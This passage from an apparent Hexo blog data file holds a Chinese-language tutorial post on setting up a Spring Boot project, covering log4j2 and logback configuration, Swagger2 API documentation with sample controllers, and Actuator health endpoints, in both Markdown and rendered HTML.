-->\n\t\t\t<maxHistory>30</maxHistory>\n\t\t</rollingPolicy>\n\t\t<encoder>\n\t\t\t<pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} %5level --- [%thread] %logger{36} : %msg%n</pattern>\n\t\t\t<charset>UTF-8</charset>\n\t\t</encoder>\n\t\t<filter class=\"ch.qos.logback.classic.filter.LevelFilter\">\n\t\t\t<level>INFO</level>\n\t\t\t<onMatch>ACCEPT</onMatch>\n\t\t\t<onMismatch>DENY</onMismatch>\n\t\t</filter>\n\t</appender>\n\n\t<appender name=\"severeDailyRollingFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n\t\t<!-- <file>E:\\\\项目\\\\demoClientLog\\\\demoClient-severe.log</file> -->\n\t\t<rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\">\n\t\t\t<!-- daily rollover -->\n\t\t\t<fileNamePattern>${log.path}\\\\demoClient-ERROR-%d{yyyyMMdd}.log</fileNamePattern>\n\t\t\t<!-- 保留30天的日志 -->\n\t\t\t<maxHistory>30</maxHistory>\n\t\t</rollingPolicy>\n\t\t<encoder>\n\t\t\t<pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} %5level --- [%thread] %logger{36} : %msg%n</pattern>\n\t\t\t<charset>UTF-8</charset>\n\t\t</encoder>\n\t\t<!-- deny all events with a level below WARN, that is TRACE, DEBUG, and INFO -->\n\t\t<filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\">\n\t\t\t<level>ERROR</level>\n\t\t</filter>\n\t</appender>\n\n\t<logger name=\"com.bonc.demoClient\" level=\"DEBUG\">\n\t\t<appender-ref ref=\"infoDailyRollingFile\" />\n\t\t<appender-ref ref=\"severeDailyRollingFile\" />\n\t</logger>\n\n\t<!-- the root level of logging -->\n\t<root level=\"INFO\">\n\t\t<appender-ref ref=\"sysDailyRollingFile\" />\n\t\t<appender-ref ref=\"infoDailyRollingFile\" />\n\t\t<appender-ref ref=\"severeDailyRollingFile\" />\n\t</root>\n\n</configuration>\n\n```\n###### 使用\n```\nprivate static final Logger logger = LoggerFactory.getLogger(ApiController.class);\n.......\nlogger.info(\".....\");\n```\n#### 2.Restful API\n使用swagger2\n- 依赖\n```\n    <!-- Swagger依赖 注意版本一致-->\n    <dependency>\n\t\t\t<groupId>io.springfox</groupId>\n\t\t\t<artifactId>springfox-swagger2</artifactId>\n\t\t\t<version>2.2.2</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>io.springfox</groupId>\n\t\t\t<artifactId>springfox-swagger-ui</artifactId>\n\t\t\t<version>2.2.2</version>\n\t\t</dependency>\n```\n- 配置类\n```\n@Configuration\n@EnableSwagger2\npublic class Swagger2 {\n    /**\n     * apis()设置监控路径\n     * @return\n     */\n    @Bean\n    public Docket createRestApi() {\n        return new Docket(DocumentationType.SWAGGER_2)\n                .apiInfo(apiInfo())\n                .select()\n                .apis(RequestHandlerSelectors.basePackage(\"com.example.springboottemplate.controllers\"))\n                .paths(PathSelectors.any())\n                .build();\n    }\n\n    /**\n     * 创建api基本信息，会展示在文档页面\n     * @return\n     */\n    private ApiInfo apiInfo() {\n        return new ApiInfoBuilder()\n                .title(\"Swagger2 demo\")\n                .description(\"Spring Boot中使用Swagger2构建RESTful APIs\")\n                .version(\"1.0\")\n                .build();\n    }\n}\n```\n- 使用<br>\n  <strong>注意：要使用@RequestParam()接收参数，需要paramType=\"query\"</strong><br>\n  具体参数信息:https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/\n\n```\n@Api(value = \"测试接口类TestController\")\n@Controller\n@ResponseBody\npublic class TestController {\n    Logger logger = LogManager.getLogger(TestController.class);\n\n    @ApiOperation(value = \"测试get不带参数\",notes = \"测试get不带参数\")\n    @RequestMapping(value = \"test1\", method = RequestMethod.GET)\n    public String test(){\n        logger.debug(\"test debug\");\n        logger.info(\"test info\");\n        logger.warn(\"test warn\");\n        logger.error(\"test error\");\n        logger.fatal(\"test fatal\");\n        return \"ok\";\n    }\n\n    @ApiOperation(value = \"测试get带参数\",notes = \"测试get带参数\")\n    @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, dataType = \"String\",paramType = \"query\")\n    @RequestMapping(value = \"test2\", method = RequestMethod.GET)\n    public String test2(@RequestParam(\"username\") String username){\n        if(!username.equals(\"\") && username != null){\n            System.out.println(username);\n            return username;\n        }else {\n            return \"null\";\n        }\n    }\n\n    @ApiOperation(value = \"测试post带实体参数\", notes = \"测试post带实体参数\")\n    @ApiImplicitParam(name = \"user\",value = \"用户名\",required = true, dataType = \"Map<String,Object>\")\n    @ApiResponses({\n           @ApiResponse(code = 400, message = \"请求参数没填好,注意为json\"),\n           @ApiResponse(code = 404, message = \"请求路径没有或页面跳转路径不对\"),\n           @ApiResponse(code = 500, message = \"服务器端发生错误\")\n   })\n    @RequestMapping(value = \"/test3\", method = RequestMethod.POST)\n    public String test3(@RequestBody Map<String,Object> user){\n        System.out.println(user.get(\"username\").toString());\n        System.out.println(user.get(\"password\").toString());\n        return \"ok\";\n    }\n\n    @ApiOperation(value = \"测试post参数为String\", notes = \"测试post参数为String\")\n    @ApiImplicitParams({\n            @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, paramType = \"query\", dataType = \"String\"),\n            @ApiImplicitParam(name = \"password\", value = \"密码\", required = true, paramType = \"query\", dataType = \"String\")\n    })\n    @RequestMapping(value = \"/test4\", method = RequestMethod.POST)\n    public String test4(@RequestParam(\"username\") String username,\n                        @RequestParam(\"password\") String passwprd){\n       return username + \":\" + passwprd;\n    }\n\n    @ApiOperation(value = \"测试restful类型接口\", notes = \"测试restful类型接口\")\n    @RequestMapping(value = \"/test5/{name}\", method = RequestMethod.GET)\n    @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, paramType = \"query\", dataType = \"String\")\n    public String test5(@PathVariable(\"name\") String name,\n                        @RequestParam(\"username\") String username){\n        return name + \" : \" + username;\n    }\n}\n```\n\n访问:http://127.0.0.1:8080/swagger-ui.html\n\n#### 3.Health\n这是2.0版本：https://blog.csdn.net/alinyua/article/details/80009435<br>\n可以直观的看到自己CPU的利用率、内存的利用率、数据库连接是否正常等信息\n- 依赖\n```\n       <dependency>\n           <groupId>org.springframework.boot</groupId>\n           <artifactId>spring-boot-starter-actuator</artifactId>\n           <!--<version>2.1.0.RELEASE</version>-->\n       </dependency>\n```\n- Springboot2版本需要在application.properties加入\n```\nmanagement.endpoints.web.exposure.include=*\n#显示所有健康状态，需要加配置\nmanagement.endpoint.health.show-details=always\n```\n 内置EndPoints：\n >http://127.0.0.1:8080/actuator<br>\n http://127.0.0.1:8080/actuator/health<br>\n http://127.0.0.1:8080/actuator/info<br>\n http://127.0.0.1:8080/actuator/beans<br>\n http://127.0.0.1:8080/actuator/httptrace\n\n\n #### 4.Eureka\n","source":"_posts/java/springboot架子.md","raw":"---\ntitle: springboot项目架子\ndate: 2018-11-23 15:47:52\ntags: [springboot]\n---\n### springboot架子搭建\n\n#### 1.日志\n\n##### （1）log4j2\n- 依赖\n```\n       <!--引入log4j2-->\n       <dependency>\n           <groupId>org.springframework.boot</groupId>\n           <artifactId>spring-boot-starter-log4j2</artifactId>\n       </dependency>\n       <!--log4j2依赖于disruptor-->\n       <dependency>\n           <groupId>com.lmax</groupId>\n           <artifactId>disruptor</artifactId>\n           <version>3.4.2</version>\n       </dependency>\n```\n- 配置文件log4j2.xml\nlog4j2默认会在classpath目录下寻找log4j.json、log4j.jsn、log4j2.xml等名称的文件，如果都没有找到，则会按默认配置输出，也就是输出到控制台\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，\n    你会看到log4j2内部各种详细输出。可以设置成OFF(关闭)或Error(只输出错误信息)\n  -->\n<Configuration status=\"INFO\">\n    <!-- 日志文件目录和压缩文件目录配置 -->\n    <Properties>\n        <Property name=\"fileName\">C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2</Property>\n        <Property name=\"fileGz\">C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2\\\\7z</Property>\n    </Properties>\n    <!--appender主要作用就是：①控制打印日志的地方、②打印日志的输出格式-->\n    <Appenders>\n        <!-- 输出控制台日志的配置 -->\n        <Console name=\"console\" target=\"SYSTEM_OUT\">\n            <!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）-->\n            <ThresholdFilter level=\"info\" onMatch=\"ACCEPT\" onMismatch=\"DENY\"/>\n            <!-- 输出日志的格式 -->\n            <PatternLayout pattern=\"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/>\n        </Console>\n\n        <!-- 打印出所有的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 -->\n        <RollingRandomAccessFile name=\"infoFile\" fileName=\"${fileName}/log-info.log\" immediateFlush=\"false\"\n                                 filePattern=\"${fileGz}/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log-info.gz\">\n            <PatternLayout pattern=\"%d{yyyy-MM-dd 'at' HH:mm:ss z} [%t] %-5level %logger{36} %L %M - %msg%xEx%n\" />\n            <Policies>\n                <TimeBasedTriggeringPolicy interval=\"6\" modulate=\"true\" />\n                <SizeBasedTriggeringPolicy size=\"100 MB\"/>\n            </Policies>\n            <Filters>\n                <!-- 只记录info和warn级别信息 -->\n                <ThresholdFilter level=\"error\" onMatch=\"DENY\" onMismatch=\"NEUTRAL\"/>\n                <ThresholdFilter level=\"info\" onMatch=\"ACCEPT\" onMismatch=\"DENY\" />\n            </Filters>\n            <!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 -->\n            <DefaultRolloverStrategy max=\"50\"/>\n        </RollingRandomAccessFile>\n\n        <!-- 存储所有error信息 -->\n        <RollingRandomAccessFile name=\"errorFile\" fileName=\"${fileName}/log-error.log\" immediateFlush=\"false\"\n                                 filePattern=\"${fileGz}/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log-error.gz\">\n            <PatternLayout pattern=\"%d{yyyy-MM-dd 'at' HH:mm:ss z} [%t] %-5level %logger{36} %L %M - %msg%xEx%n\" />\n            <Policies>\n                <TimeBasedTriggeringPolicy interval=\"6\" modulate=\"true\" />\n                <SizeBasedTriggeringPolicy size=\"100 MB\"/>\n            </Policies>\n            <Filters>\n                <!-- 只记录error级别信息 -->\n                <ThresholdFilter level=\"error\" onMatch=\"ACCEPT\" onMismatch=\"DENY\" />\n            </Filters>\n            <!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 -->\n            <DefaultRolloverStrategy max=\"50\"/>\n        </RollingRandomAccessFile>\n    </Appenders>\n\n    <!-- 全局配置，默认所有的Logger都继承此配置 -->\n    <Loggers>\n        <!-- AsyncRoot - 异步记录日志 - 需要LMAX Disruptor的支持 -->\n        <AsyncRoot level=\"info\" additivity=\"false\">\n            <AppenderRef ref=\"console\"/>\n            <AppenderRef ref=\"infoFile\"/>\n            <AppenderRef ref=\"errorFile\"/>\n        </AsyncRoot>\n    </Loggers>\n</Configuration>\n```\n- 使用\n```\n@Controller\npublic class TestController {\n    Logger logger = LogManager.getLogger(TestController.class);\n\n    @RequestMapping(value = \"test\", method = RequestMethod.GET)\n    @ResponseBody\n    public String test(){\n        logger.debug(\"test debug\");\n        logger.info(\"test info\");\n        logger.warn(\"test warn\");\n        logger.error(\"test error\");\n        logger.fatal(\"test fatal\");\n        return \"ok\";\n    }\n}\n```\n##### logback(默认)\n在resouces下添加logback-spring.xml配置文件\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n\t<include resource=\"org/springframework/boot/logging/logback/base.xml\" />\n\t<jmxConfigurator/>\n\t<!--<property name=\"log.path\" value=\"/home/jzyx/epmnew/logs\"/>-->\n    <property name=\"log.path\" value=\"D:\\\\Logs\\\\aipmanage\\\\logs\\\\\"/>\n\t<!--<property name=\"log.path\" value=\"\\\\opt\"/>-->\n\n\t<appender name=\"console\" class=\"ch.qos.logback.core.ConsoleAppender\">\n\t\t<!-- Log message format -->\n\t\t<encoder>\n\t\t\t<pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} %5level --- [%thread] %logger{36} : %msg%n</pattern>\n\t\t\t<charset>UTF-8</charset>\n\t\t</encoder>\n\t\t<!-- deny all events with a level below DEBUG, that is TRACE  -->\n\t\t<filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\">\n\t\t\t<level>DEBUG</level>\n\t\t</filter>\n\t</appender>\n\n\t<appender name=\"sysDailyRollingFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n\t\t<!--  <file>E:\\\\项目\\\\demoClientLog\\\\sys.log</file>-->\n\t\t<rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\">\n\t\t\t<!-- daily rollover -->\n\t\t\t<fileNamePattern>${log.path}\\\\demoClient-DEBUG-%d{yyyyMMdd}.log</fileNamePattern>\n\t\t\t<!-- 保留30天的日志 -->\n\t\t\t<maxHistory>30</maxHistory>\n\t\t</rollingPolicy>\n\t\t<encoder>\n\t\t\t<pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} %5level --- [%thread] %logger{36} : %msg%n</pattern>\n\t\t\t<charset>UTF-8</charset>\n\t\t</encoder>\n\t\t<filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\">\n\t\t\t<level>DEBUG</level>\n\t\t</filter>\n\t</appender>\n\n\t<appender name=\"infoDailyRollingFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n\t\t<!-- <file>E:\\\\项目\\\\demoClientLog\\\\demoClient-info.log</file> -->\n\t\t<rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\">\n\t\t\t<!-- daily rollover -->\n\t\t\t<fileNamePattern>${log.path}\\\\demoClient-INFO-%d{yyyyMMdd}.log</fileNamePattern>\n\t\t\t<!-- 保留30天的日志 -->\n\t\t\t<maxHistory>30</maxHistory>\n\t\t</rollingPolicy>\n\t\t<encoder>\n\t\t\t<pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} %5level --- [%thread] %logger{36} : %msg%n</pattern>\n\t\t\t<charset>UTF-8</charset>\n\t\t</encoder>\n\t\t<filter class=\"ch.qos.logback.classic.filter.LevelFilter\">\n\t\t\t<level>INFO</level>\n\t\t\t<onMatch>ACCEPT</onMatch>\n\t\t\t<onMismatch>DENY</onMismatch>\n\t\t</filter>\n\t</appender>\n\n\t<appender name=\"severeDailyRollingFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n\t\t<!-- <file>E:\\\\项目\\\\demoClientLog\\\\demoClient-severe.log</file> -->\n\t\t<rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\">\n\t\t\t<!-- daily rollover -->\n\t\t\t<fileNamePattern>${log.path}\\\\demoClient-ERROR-%d{yyyyMMdd}.log</fileNamePattern>\n\t\t\t<!-- 保留30天的日志 -->\n\t\t\t<maxHistory>30</maxHistory>\n\t\t</rollingPolicy>\n\t\t<encoder>\n\t\t\t<pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} %5level --- [%thread] %logger{36} : %msg%n</pattern>\n\t\t\t<charset>UTF-8</charset>\n\t\t</encoder>\n\t\t<!-- deny all events with a level below WARN, that is TRACE, DEBUG, and INFO -->\n\t\t<filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\">\n\t\t\t<level>ERROR</level>\n\t\t</filter>\n\t</appender>\n\n\t<logger name=\"com.bonc.demoClient\" level=\"DEBUG\">\n\t\t<appender-ref ref=\"infoDailyRollingFile\" />\n\t\t<appender-ref ref=\"severeDailyRollingFile\" />\n\t</logger>\n\n\t<!-- the root level of logging -->\n\t<root level=\"INFO\">\n\t\t<appender-ref ref=\"sysDailyRollingFile\" />\n\t\t<appender-ref ref=\"infoDailyRollingFile\" />\n\t\t<appender-ref ref=\"severeDailyRollingFile\" />\n\t</root>\n\n</configuration>\n\n```\n###### 使用\n```\nprivate static final Logger logger = LoggerFactory.getLogger(ApiController.class);\n.......\nlogger.info(\".....\");\n```\n#### 2.Restful API\n使用swagger2\n- 依赖\n```\n    <!-- Swagger依赖 注意版本一致-->\n    <dependency>\n\t\t\t<groupId>io.springfox</groupId>\n\t\t\t<artifactId>springfox-swagger2</artifactId>\n\t\t\t<version>2.2.2</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>io.springfox</groupId>\n\t\t\t<artifactId>springfox-swagger-ui</artifactId>\n\t\t\t<version>2.2.2</version>\n\t\t</dependency>\n```\n- 配置类\n```\n@Configuration\n@EnableSwagger2\npublic class Swagger2 {\n    /**\n     * apis()设置监控路径\n     * @return\n     */\n    @Bean\n    public Docket createRestApi() {\n        return new Docket(DocumentationType.SWAGGER_2)\n                .apiInfo(apiInfo())\n                .select()\n                .apis(RequestHandlerSelectors.basePackage(\"com.example.springboottemplate.controllers\"))\n                .paths(PathSelectors.any())\n                .build();\n    }\n\n    /**\n     * 创建api基本信息，会展示在文档页面\n     * @return\n     */\n    private ApiInfo apiInfo() {\n        return new ApiInfoBuilder()\n                .title(\"Swagger2 demo\")\n                .description(\"Spring Boot中使用Swagger2构建RESTful APIs\")\n                .version(\"1.0\")\n                .build();\n    }\n}\n```\n- 使用<br>\n  <strong>注意：要使用@RequestParam()接收参数，需要paramType=\"query\"</strong><br>\n  具体参数信息:https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/\n\n```\n@Api(value = \"测试接口类TestController\")\n@Controller\n@ResponseBody\npublic class TestController {\n    Logger logger = LogManager.getLogger(TestController.class);\n\n    @ApiOperation(value = \"测试get不带参数\",notes = \"测试get不带参数\")\n    @RequestMapping(value = \"test1\", method = RequestMethod.GET)\n    public String test(){\n        logger.debug(\"test debug\");\n        logger.info(\"test info\");\n        logger.warn(\"test warn\");\n        logger.error(\"test error\");\n        logger.fatal(\"test fatal\");\n        return \"ok\";\n    }\n\n    @ApiOperation(value = \"测试get带参数\",notes = \"测试get带参数\")\n    @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, dataType = \"String\",paramType = \"query\")\n    @RequestMapping(value = \"test2\", method = RequestMethod.GET)\n    public String test2(@RequestParam(\"username\") String username){\n        if(!username.equals(\"\") && username != null){\n            System.out.println(username);\n            return username;\n        }else {\n            return \"null\";\n        }\n    }\n\n    @ApiOperation(value = \"测试post带实体参数\", notes = \"测试post带实体参数\")\n    @ApiImplicitParam(name = \"user\",value = \"用户名\",required = true, dataType = \"Map<String,Object>\")\n    @ApiResponses({\n           @ApiResponse(code = 400, message = \"请求参数没填好,注意为json\"),\n           @ApiResponse(code = 404, message = \"请求路径没有或页面跳转路径不对\"),\n           @ApiResponse(code = 500, message = \"服务器端发生错误\")\n   })\n    @RequestMapping(value = \"/test3\", method = RequestMethod.POST)\n    public String test3(@RequestBody Map<String,Object> user){\n        System.out.println(user.get(\"username\").toString());\n        System.out.println(user.get(\"password\").toString());\n        return \"ok\";\n    }\n\n    @ApiOperation(value = \"测试post参数为String\", notes = \"测试post参数为String\")\n    @ApiImplicitParams({\n            @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, paramType = \"query\", dataType = \"String\"),\n            @ApiImplicitParam(name = \"password\", value = \"密码\", required = true, paramType = \"query\", dataType = \"String\")\n    })\n    @RequestMapping(value = \"/test4\", method = RequestMethod.POST)\n    public String test4(@RequestParam(\"username\") String username,\n                        @RequestParam(\"password\") String passwprd){\n       return username + \":\" + passwprd;\n    }\n\n    @ApiOperation(value = \"测试restful类型接口\", notes = \"测试restful类型接口\")\n    @RequestMapping(value = \"/test5/{name}\", method = RequestMethod.GET)\n    @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, paramType = \"query\", dataType = \"String\")\n    public String test5(@PathVariable(\"name\") String name,\n                        @RequestParam(\"username\") String username){\n        return name + \" : \" + username;\n    }\n}\n```\n\n访问:http://127.0.0.1:8080/swagger-ui.html\n\n#### 3.Health\n这是2.0版本：https://blog.csdn.net/alinyua/article/details/80009435<br>\n可以直观的看到自己CPU的利用率、内存的利用率、数据库连接是否正常等信息\n- 依赖\n```\n       <dependency>\n           <groupId>org.springframework.boot</groupId>\n           <artifactId>spring-boot-starter-actuator</artifactId>\n           <!--<version>2.1.0.RELEASE</version>-->\n       </dependency>\n```\n- Springboot2版本需要在application.properties加入\n```\nmanagement.endpoints.web.exposure.include=*\n#显示所有健康状态，需要加配置\nmanagement.endpoint.health.show-details=always\n```\n 内置EndPoints：\n >http://127.0.0.1:8080/actuator<br>\n http://127.0.0.1:8080/actuator/health<br>\n http://127.0.0.1:8080/actuator/info<br>\n http://127.0.0.1:8080/actuator/beans<br>\n http://127.0.0.1:8080/actuator/httptrace\n\n\n #### 4.Eureka\n","slug":"java/springboot架子","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321j1003e6dcpuhu2v55g","content":"<h3 id=\"springboot架子搭建\"><a href=\"#springboot架子搭建\" class=\"headerlink\" title=\"springboot架子搭建\"></a>springboot架子搭建</h3><h4 id=\"1-日志\"><a href=\"#1-日志\" class=\"headerlink\" title=\"1.日志\"></a>1.日志</h4><h5 id=\"（1）log4j2\"><a href=\"#（1）log4j2\" class=\"headerlink\" title=\"（1）log4j2\"></a>（1）log4j2</h5><ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--引入log4j2--&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!--log4j2依赖于disruptor--&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.lmax&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;disruptor&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;3.4.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置文件log4j2.xml<br>log4j2默认会在classpath目录下寻找log4j.json、log4j.jsn、log4j2.xml等名称的文件，如果都没有找到，则会按默认配置输出，也就是输出到控制台</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!-- Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，</span><br><span class=\"line\">    你会看到log4j2内部各种详细输出。可以设置成OFF(关闭)或Error(只输出错误信息)</span><br><span class=\"line\">  --&gt;</span><br><span class=\"line\">&lt;Configuration status=&quot;INFO&quot;&gt;</span><br><span class=\"line\">    &lt;!-- 日志文件目录和压缩文件目录配置 --&gt;</span><br><span class=\"line\">    &lt;Properties&gt;</span><br><span class=\"line\">        &lt;Property name=&quot;fileName&quot;&gt;C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2&lt;/Property&gt;</span><br><span class=\"line\">        &lt;Property name=&quot;fileGz&quot;&gt;C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2\\\\7z&lt;/Property&gt;</span><br><span class=\"line\">    &lt;/Properties&gt;</span><br><span class=\"line\">    &lt;!--appender主要作用就是：①控制打印日志的地方、②打印日志的输出格式--&gt;</span><br><span class=\"line\">    &lt;Appenders&gt;</span><br><span class=\"line\">        &lt;!-- 输出控制台日志的配置 --&gt;</span><br><span class=\"line\">        &lt;Console name=&quot;console&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class=\"line\">            &lt;!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）--&gt;</span><br><span class=\"line\">            &lt;ThresholdFilter level=&quot;info&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot;/&gt;</span><br><span class=\"line\">            &lt;!-- 输出日志的格式 --&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;</span><br><span class=\"line\">        &lt;/Console&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;!-- 打印出所有的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 --&gt;</span><br><span class=\"line\">        &lt;RollingRandomAccessFile name=&quot;infoFile&quot; fileName=&quot;$&#123;fileName&#125;/log-info.log&quot; immediateFlush=&quot;false&quot;</span><br><span class=\"line\">                                 filePattern=&quot;$&#123;fileGz&#125;/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log-info.gz&quot;&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd &apos;at&apos; HH:mm:ss z&#125; [%t] %-5level %logger&#123;36&#125; %L %M - %msg%xEx%n&quot; /&gt;</span><br><span class=\"line\">            &lt;Policies&gt;</span><br><span class=\"line\">                &lt;TimeBasedTriggeringPolicy interval=&quot;6&quot; modulate=&quot;true&quot; /&gt;</span><br><span class=\"line\">                &lt;SizeBasedTriggeringPolicy size=&quot;100 MB&quot;/&gt;</span><br><span class=\"line\">            &lt;/Policies&gt;</span><br><span class=\"line\">            &lt;Filters&gt;</span><br><span class=\"line\">                &lt;!-- 只记录info和warn级别信息 --&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;error&quot; onMatch=&quot;DENY&quot; onMismatch=&quot;NEUTRAL&quot;/&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;info&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot; /&gt;</span><br><span class=\"line\">            &lt;/Filters&gt;</span><br><span class=\"line\">            &lt;!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 --&gt;</span><br><span class=\"line\">            &lt;DefaultRolloverStrategy max=&quot;50&quot;/&gt;</span><br><span class=\"line\">        &lt;/RollingRandomAccessFile&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;!-- 存储所有error信息 --&gt;</span><br><span class=\"line\">        &lt;RollingRandomAccessFile name=&quot;errorFile&quot; fileName=&quot;$&#123;fileName&#125;/log-error.log&quot; immediateFlush=&quot;false&quot;</span><br><span class=\"line\">                                 filePattern=&quot;$&#123;fileGz&#125;/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log-error.gz&quot;&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd &apos;at&apos; HH:mm:ss z&#125; [%t] %-5level %logger&#123;36&#125; %L %M - %msg%xEx%n&quot; /&gt;</span><br><span class=\"line\">            &lt;Policies&gt;</span><br><span class=\"line\">                &lt;TimeBasedTriggeringPolicy interval=&quot;6&quot; modulate=&quot;true&quot; /&gt;</span><br><span class=\"line\">                &lt;SizeBasedTriggeringPolicy size=&quot;100 MB&quot;/&gt;</span><br><span class=\"line\">            &lt;/Policies&gt;</span><br><span class=\"line\">            &lt;Filters&gt;</span><br><span class=\"line\">                &lt;!-- 只记录error级别信息 --&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter 